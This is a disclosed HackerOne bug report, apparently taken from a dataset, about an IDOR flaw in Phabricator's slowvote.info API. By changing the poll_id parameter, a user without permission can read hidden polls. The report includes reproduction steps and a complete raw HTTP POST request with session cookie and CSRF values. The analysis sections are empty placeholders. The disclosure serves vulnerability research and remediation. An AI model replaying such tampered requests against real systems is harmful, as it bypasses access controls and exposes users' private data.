---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '661978'
original_report_id: '661978'
title: IDOR bug to See hidden slowvote of any user even when you dont have access
  right
weakness: Insecure Direct Object Reference (IDOR)
team_handle: phabricator
created_at: '2019-07-27T19:16:59.210Z'
disclosed_at: '2019-08-29T19:00:51.889Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 22
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# IDOR bug to See hidden slowvote of any user even when you dont have access right

## Metadata

- HackerOne Report ID: 661978
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: phabricator
- Disclosed At: 2019-08-29T19:00:51.889Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

USER ACCOUNT
=============
1. user A (who create slowvote)
2. User B (Dont have permissioon to see above slowvote)
3. User C (has permission to see above slowvote)

STEP TO REPRODUCE
==================
1. From user A account goto http://phabricator.localhost.com/vote/create/ and create a slowvote .
   Change this slowvote "Visible To" to "No one" or to user C .
  Slowvote url will be now like http://phabricator.localhost.com/V1 .

2. Now user B visit above slowvote url http://phabricator.localhost.com/V1 and see that he dont have access permission .
Now user B sent bellow request and can see any hidden slowvote 

```
POST /api/slowvote.info HTTP/1.1
Host: phabricator.localhost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Connection: close
Cookie: phsid=smpm4rp6yltbzna3qda2nwbomsoidzwjfshkkw7v; phusr=admin
Upgrade-Insecure-Requests: 1

__csrf__=B%40wmnrkyq3468c99179280354c&__form__=1&params%5Bpoll_id%5D=1&output=human
```
here just change poll_id parameter value to your target poll id and see that hidden poll

## Impact

Fix this

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
